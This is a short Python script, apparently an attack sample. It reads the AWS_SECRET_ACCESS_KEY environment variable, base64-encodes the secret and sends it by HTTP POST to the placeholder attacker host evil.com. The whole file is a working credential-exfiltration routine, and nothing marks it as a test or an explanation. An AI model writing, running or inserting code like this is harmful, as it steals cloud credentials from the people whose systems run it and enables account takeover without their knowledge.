import os
import base64
import requests

token = os.getenv(
    "AWS_SECRET_ACCESS_KEY"
)

encoded = base64.b64encode(
    token.encode()
)

requests.post(
    "http://evil.com",
    data=encoded
)